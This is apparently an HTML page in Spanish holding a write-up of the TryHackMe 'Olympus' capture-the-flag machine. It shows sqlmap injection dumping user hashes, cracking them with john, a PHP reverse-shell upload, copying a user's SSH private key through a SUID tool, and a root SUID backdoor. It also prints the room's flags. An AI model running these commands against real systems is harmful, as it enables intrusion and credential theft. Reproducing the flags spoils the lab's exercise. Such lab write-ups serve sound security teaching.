@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Olympus — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --green: #2ecc71;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.linux  { border-color: var(--green);   color: var(--green); }
+  .tag.web    { border-color: var(--accent);   color: var(--accent); }
+  .tag.sqli   { border-color: var(--red);      color: var(--red); }
+  .tag.php    { border-color: var(--yellow);   color: var(--yellow); }
+  .tag.regex  { border-color: var(--accent2);  color: var(--accent2); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  h2 .green   { color: var(--green); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.bash   { border-left-color: var(--green); color: #a8e6c3; }
+  .code-block.php    { border-left-color: var(--yellow); color: #f0e080; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';           background: var(--accent3);  color: #fff; }
+  .finding.success::before { content: 'PWN';            background: var(--accent);   color: #fff; }
+  .finding.vuln::before    { content: 'VULN';           background: var(--red);      color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow);   color: #000; }
+  .finding.tip::before     { content: 'TIP';            background: var(--green);    color: #000; }
+  .finding.rabbit::before  { content: 'RABBIT HOLE';   background: var(--text-dim); color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--green); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-box.key { border-color: rgba(255,211,42,0.3); background: rgba(255,211,42,0.03); }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-box.key .flag-label { color: var(--yellow); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  .highlight { color: var(--accent2); }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+
+  /* TASKS */
+  .task-list { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }
+
+  .task-item {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+  }
+
+  .task-q {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    color: var(--text);
+    flex: 1;
+    min-width: 200px;
+  }
+
+  .task-a {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #fff;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    padding: 6px 16px;
+    letter-spacing: 1px;
+    white-space: nowrap;
+    filter: blur(5px);
+    user-select: none;
+    transition: filter 0.3s;
+    cursor: pointer;
+  }
+
+  .task-a:hover, .task-a.revealed { filter: blur(0); }
+
+  .task-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 3px 10px;
+    border: 1px solid rgba(46,204,113,0.4);
+    color: var(--green);
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// TryHackMe — CTF — Writeup</div>
+    <h1>OLY<span class="glow">MPUS</span></h1>
+    <div class="header-meta">
+      <span class="tag linux">#linux</span>
+      <span class="tag web">#web</span>
+      <span class="tag sqli">#sqli</span>
+      <span class="tag php">#php</span>
+      <span class="tag regex">#regex</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Se lanza un escaneo completo de puertos para mapear la superficie de ataque antes de pasar al análisis en profundidad de los servicios expuestos.</p>
+
+    <div class="code-label">escaneo completo</div>
+    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts.txt</div>
+
+    <div class="code-label">escaneo de servicios y versiones</div>
+    <div class="code-block cmd">nmap -p22,80 -sSCV -T5 -n -Pn -vvv &lt;IP&gt; -oN scan.txt</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+          <th>VERSIÓN</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">22/tcp</td><td class="port-open">OPEN</td><td>ssh</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr>
+        <tr><td class="port-num">80/tcp</td><td class="port-open">OPEN</td><td>http</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr>
+      </tbody>
+    </table>
+
+    <div class="finding info">
+      <div class="finding-title">Redirección a olimpo</div>
+      El escaneo revela que el servidor redirige a <strong style="color:#fff">http://olympus.thm</strong>. Es necesario añadir la entrada al <code>/etc/hosts</code> para que el dominio resuelva correctamente antes de continuar con la enumeración web.
+    </div>
+
+    <div class="code-label">añadir al /etc/hosts</div>
+    <div class="code-block bash">echo "&lt;IP&gt; olympus.thm" | sudo tee -a /etc/hosts</div>
+
+    <p>La web muestra un único mensaje indicando que la versión antigua del sitio sigue accesible en el mismo dominio. No hay nada más en el código fuente.</p>
+
+    <div class="code-block output">The website is still under developpment. If support is needed, please
+contact root@the-it-department. The old version of the website is still
+accessible on this domain.</div>
+  </section>
+
+  <!-- FASE 2: ENUMERACIÓN WEB -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent3">ENUMERACIÓN WEB</span> — Victor CMS</h2>
+
+    <p>Se enumeran subdirectorios con gobuster para ampliar la superficie. Los resultados iniciales no son prometedores: <code>/javascript</code> devuelve 403 y <code>/static</code> no contiene nada de interés.</p>
+
+    <div class="code-label">enumeración de directorios</div>
+    <div class="code-block cmd">gobuster dir -u http://olympus.thm/ -w &lt;DICCIONARIO&gt; -x php,txt,html,js</div>
+
+    <div class="code-block output">index.php        (Status: 200) [Size: 1948]
+static           (Status: 301) [Size: 311]
+javascript       (Status: 301) [Size: 315]
+phpmyadmin       (Status: 403) [Size: 276]</div>
+
+    <p>Lanzando <code>dirb</code> con su wordlist por defecto se descubre el subdirectorio oculto que da acceso a la versión antigua.</p>
+
+    <div class="code-label">dirb para descubrir rutas no estándar</div>
+    <div class="code-block cmd">dirb http://olympus.thm</div>
+
+    <div class="code-block output">==&gt; DIRECTORY: http://olympus.thm/~webmaster/</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Victor CMS — SQLi confirmada</div>
+      El directorio <code>/~webmaster/</code> expone una instalación de <strong style="color:#fff">Victor CMS</strong>. Este software tiene una vulnerabilidad de inyección SQL documentada en el parámetro <code>search</code> del fichero <code>search.php</code>. La inyección es explotable directamente con sqlmap.
+    </div>
+  </section>
+
+  <!-- FASE 3: EXPLOTACIÓN SQLi -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">EXPLOTACIÓN</span> — SQL Injection con sqlmap</h2>
+
+    <p>Se lanza sqlmap apuntando al endpoint vulnerable con el payload marcado con el asterisco para indicar el punto de inyección. El flag <code>--dbs</code> enumera todas las bases de datos disponibles.</p>
+
+    <div class="code-label">enumeración de bases de datos</div>
+    <div class="code-block cmd">sqlmap -u "http://olympus.thm/~webmaster/search.php" \
+  --data="search=1337*&amp;submit=" --dbs --random-agent -v 3</div>
+
+    <div class="code-block output">[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys</div>
+
+    <p>La base de datos <code>olympus</code> contiene seis tablas. Se inspeccionan primero <code>flag</code> y luego <code>users</code>.</p>
+
+    <div class="code-label">tablas en la base de datos olympus</div>
+    <div class="code-block cmd">sqlmap -u "http://olympus.thm/~webmaster/search.php" \
+  --data="search=1337*&amp;submit=" -D olympus --tables --random-agent</div>
+
+    <div class="code-block output">Database: olympus
+[6 tables]
++------------+
+| categories |
+| chats      |
+| comments   |
+| flag       |
+| posts      |
+| users      |
++------------+</div>
+
+    <div class="code-label">volcado de la tabla flag</div>
+    <div class="code-block cmd">sqlmap -u "http://olympus.thm/~webmaster/search.php" \
+  --data="search=1337*&amp;submit=" -D olympus -T flag --dump --random-agent</div>
+
+    <div class="flag-box">
+      <span class="flag-label">FLAG 1</span>
+      <span class="flag-value">flag{Sm4rt!_k33P_d1gGIng}</span>
+    </div>
+
+    <div class="code-label">volcado de la tabla users</div>
+    <div class="code-block cmd">sqlmap -u "http://olympus.thm/~webmaster/search.php" \
+  --data="search=1337*&amp;submit=" -D olympus -T users --dump --random-agent</div>
+
+    <div class="code-block output">+----+---------+--------+-------+---------------------+-----------+-------------------------------------------------------------+
+| id | role    | uname  | fname | email               | lname     | user_password                                               |
++----+---------+--------+-------+---------------------+-----------+-------------------------------------------------------------+
+| 3  | User    | prome  | &lt;b&gt;   | prometheus@olympus  | &lt;b&gt;        | $2y$10$YC6uoMwK9VpB5QL513vrLu1RV2sqBf01c81zPHcz1gK2EArDvnj3C |
+| 6  | Admin   | root   | &lt;b&gt;   | root@chat.olympus   | &lt;b&gt;        | $2y$10$lcs4XWc5|VNSMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mk |
+| 7  | User    | zeus   | &lt;b&gt;   | zeus@chat.olympus   | &lt;b&gt;        | $2y$10$cpJKDXh2wLAI5KlCs0aLC0nf6g5f1G8QS053zp/r8HMtaj6rT4IC |
++----+---------+--------+-------+---------------------+-----------+-------------------------------------------------------------+</div>
+
+    <div class="finding info">
+      <div class="finding-title">Subdominio chat.olympus.thm</div>
+      Los emails de los usuarios revelan la existencia del subdominio <strong style="color:#fff">chat.olympus.thm</strong>. Hay que añadirlo al <code>/etc/hosts</code> para poder acceder al panel de chat donde se usarán las credenciales crackeadas.
+    </div>
+
+    <div class="code-label">crackeo de hashes con john</div>
+    <div class="code-block cmd">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</div>
+
+    <div class="code-block output">summertime       (prometheus)</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">CREDENCIAL</span>
+      <span class="flag-value">prometheus : summertime</span>
+    </div>
+  </section>
+
+  <!-- FASE 4: ACCESO INICIAL -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">ACCESO INICIAL</span> — Reverse shell via upload</h2>
+
+    <p>Con las credenciales de prometheus se accede al panel de <code>chat.olympus.thm</code>. La aplicación permite adjuntar ficheros en el chat. Se sube una reverse shell en PHP.</p>
+
+    <p>Al intentar acceder a <code>/uploads/shell.php</code> la respuesta es una página en blanco. Revisando la tabla <code>chats</code> de la base de datos se descubre el motivo.</p>
+
+    <div class="code-label">volcado de la tabla chats</div>
+    <div class="code-block cmd">sqlmap -u "http://olympus.thm/~webmaster/search.php" \
+  --data="search=1337*&amp;submit=" -D olympus -T chats --dump --random-agent</div>
+
+    <div class="code-block output">| 2022-04-05 | Attached : prometheus_password.txt                                            | prometheus |
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it      | prometheus |
+|            | seems the filename got changed somehow because I can't download it back...    |            |
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to    | zeus       |
+|            | make it harder for attackers to access the uploaded files.                    |            |
+| 2026-03-31 | Attached : shell.php                                                          | prometheus |
+|            | af1cd75a6dd6d5356ccea9c6d49e1486.php                                          |            |</div>
+
+    <div class="finding tip">
+      <div class="finding-title">Renombrado aleatorio de ficheros</div>
+      El servidor aplica una función de renombrado aleatorio a los ficheros subidos para dificultar el acceso directo. El nombre real del fichero queda registrado en la tabla <code>chats</code>, lo que permite recuperarlo a través de la SQLi. En este caso el fichero se encuentra en <code>/uploads/af1cd75a6dd6d5356ccea9c6d49e1486.php</code>.
+    </div>
+
+    <div class="code-label">ponerse a la escucha y lanzar la shell</div>
+    <div class="code-block cmd">nc -lvnp 4444</div>
+
+    <div class="code-block output">www-data@ip-10-128-137-147:/$</div>
+
+    <div class="finding success">
+      <div class="finding-title">Shell como www-data</div>
+      Acceso inicial conseguido como <strong style="color:#fff">www-data</strong>. El directorio <code>/home/zeus</code> contiene la segunda flag.
+    </div>
+
+    <div class="code-label">lectura de la flag de usuario</div>
+    <div class="code-block cmd">cat /home/zeus/user.flag</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}</span>
+    </div>
+  </section>
+
+  <!-- FASE 5: ESCALADA A ZEUS -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 05</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">ESCALADA — ZEUS</span> — SUID cputils + clave RSA</h2>
+
+    <p>Se buscan binarios con el bit SUID activo. Entre los resultados destaca <code>/usr/bin/cputils</code>, un binario personalizado que pertenece al usuario <strong style="color:#fff">zeus</strong> y permite copiar ficheros arbitrarios con sus privilegios.</p>
+
+    <div class="code-label">búsqueda de binarios SUID</div>
+    <div class="code-block cmd">find / -perm -4000 -ls 2>/dev/null</div>
+
+    <div class="code-block output">...
+/usr/bin/cputils  (owner: zeus, SUID activo)
+...</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">SUID cputils — lectura de ficheros como zeus</div>
+      El binario <code>cputils</code> tiene SUID con propietario zeus. Permite copiar cualquier fichero al que zeus tenga acceso a una ruta que controle <code>www-data</code>. Se usa para extraer la clave privada SSH de zeus ubicada en <code>/home/zeus/.ssh/id_rsa</code>.
+    </div>
+
+    <div class="code-label">copia de la clave RSA de zeus</div>
+    <div class="code-block cmd">/usr/bin/cputils
+
+Enter the Name of Source File: /home/zeus/.ssh/id_rsa
+Enter the Name of Target File: /tmp/id_rsa
+
+File copied successfully.</div>
+
+    <div class="code-label">la clave tiene passphrase — crackeo con john</div>
+    <div class="code-block cmd">ssh2john /tmp/id_rsa > zeus_rsa_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zeus_rsa_hash</div>
+
+    <div class="code-block output">snowflake        (zeus_rsa)</div>
+
+    <div class="code-label">acceso SSH como zeus</div>
+    <div class="code-block cmd">ssh -i id_rsa zeus@&lt;IP&gt;
+# passphrase: snowflake</div>
+
+    <div class="code-block output">zeus@ip-10-128-137-147:~$</div>
+  </section>
+
+  <!-- FASE 6: ESCALADA A ROOT -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 06</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">ESCALADA — ROOT</span> — Backdoor PHP</h2>
+
+    <p>Se explora el directorio web en busca de ficheros interesantes. En <code>/var/www/html/</code> existe un subdirectorio con nombre aparentemente aleatorio que contiene un fichero PHP sospechoso.</p>
+
+    <div class="code-label">inspección del directorio web</div>
+    <div class="code-block cmd">ls /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/</div>
+
+    <div class="code-block output">VIGQFQFMYOST.php</div>
+
+    <div class="code-label">contenido del fichero PHP</div>
+    <div class="code-block php">&lt;?php
+$suid_bd = "/lib/defended/libc.so.99";
+$shell   = "uname -a; w; $suid_bd";
+?&gt;</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Backdoor SUID — /lib/defended/libc.so.99</div>
+      El fichero PHP expone la existencia de un binario oculto en <code>/lib/defended/libc.so.99</code> con el bit SUID activo y propietario root. Ejecutarlo directamente desde una sesión de zeus otorga una shell como <strong style="color:#fff">root</strong>.
+    </div>
+
+    <div class="code-label">escalada a root mediante el binario SUID</div>
+    <div class="code-block cmd">zeus@ip-10-128-137-147:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ /lib/defended/libc.so.99</div>
+
+    <div class="code-block output"># whoami
+root
+# bash
+root@ip-10-128-137-147:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc#</div>
+
+    <div class="code-label">flag de root</div>
+    <div class="code-block cmd">cat /root/root.flag</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">ROOT FLAG</span>
+      <span class="flag-value">flag{D4mN!_Y0u_G0T_m3_:)_}</span>
+    </div>
+  </section>
+
+  <!-- FASE 7: BONUS FLAG -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 07</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="green">BONUS FLAG</span> — Regex hunting</h2>
+
+    <p>En <code>/root</code> aparece un mensaje extra de Prometheus indicando que hay una flag oculta y recomendando acceder como root por SSH para encontrarla. La pista menciona que <code>grep -irl flag{</code> es útil.</p>
+
+    <div class="code-block output">PS : Prometheus left a hidden flag, try and find it !
+I recommend logging as root over ssh to look for it ;)
+(Hint : regex can be usefull)</div>
+
+    <div class="code-label">búsqueda recursiva de flags con regex</div>
+    <div class="code-block cmd">grep -irl "flag{" /</div>
+
+    <div class="code-block output">/etc/ssl/private/.b0nus.fl4g</div>
+
+    <div class="code-label">lectura de la bonus flag</div>
+    <div class="code-block cmd">cat /etc/ssl/private/.b0nus.fl4g</div>
+
+    <div class="code-block output">Here is the final flag ! Congrats !
+
+flag{Y0u_G0t_m3_g00d!}
+
+As a reminder, here is a usefull regex :
+grep -irl flag{</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">BONUS FLAG</span>
+      <span class="flag-value">flag{Y0u_G0t_m3_g00d!}</span>
+    </div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Por qué funciona grep -irl?</div>
+      <code>grep -i</code> ignora mayúsculas/minúsculas, <code>-r</code> hace la búsqueda recursiva por todo el árbol de directorios y <code>-l</code> muestra solo los nombres de los ficheros que contienen coincidencias en lugar de las líneas completas. Combinado con el patrón <code>flag{</code> es una forma rápida de localizar flags ocultas en cualquier punto del sistema de ficheros.
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Enumeración — Victor CMS</div>
+          <div class="chain-desc">gobuster no revela nada útil → dirb descubre <code>/~webmaster/</code> con Victor CMS → SQLi en <code>search.php</code> confirmada</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">SQLi — Extracción de credenciales y flag</div>
+          <div class="chain-desc">sqlmap vuelca la base de datos <code>olympus</code> → <code>flag{Sm4rt!_k33P_d1gGIng}</code> en tabla <code>flag</code> → hashes bcrypt de usuarios → john crackea <code>prometheus:summertime</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Upload + Rename bypass — Shell como www-data</div>
+          <div class="chain-desc">Login en <code>chat.olympus.thm</code> → reverse shell subida como adjunto → nombre real recuperado via SQLi en tabla <code>chats</code> → acceso a <code>/uploads/af1cd75a6dd6d5356ccea9c6d49e1486.php</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">04</div>
+        <div class="chain-content">
+          <div class="chain-title">SUID cputils — Clave RSA de zeus</div>
+          <div class="chain-desc"><code>/usr/bin/cputils</code> con SUID de zeus permite leer <code>/home/zeus/.ssh/id_rsa</code> → passphrase crackeada con john (<code>snowflake</code>) → SSH como zeus</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--red); color: var(--red);">05</div>
+        <div class="chain-content">
+          <div class="chain-title">Backdoor PHP — /lib/defended/libc.so.99</div>
+          <div class="chain-desc">Fichero PHP en directorio oculto del web expone ruta de binario SUID → <code>/lib/defended/libc.so.99</code> → shell como root → <code>flag{D4mN!_Y0u_G0T_m3_:)_}</code></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--green); color: var(--green);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--green);">Regex hunting — Bonus flag</div>
+          <div class="chain-desc"><code>grep -irl flag{</code> desde <code>/</code> localiza <code>/etc/ssl/private/.b0nus.fl4g</code> → <code>flag{Y0u_G0t_m3_g00d!}</code></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">OLYMPUS // WRITEUP // TRYHACKME — CTF</div>
+  </div>
+</footer>
+
+</body>
+</html>
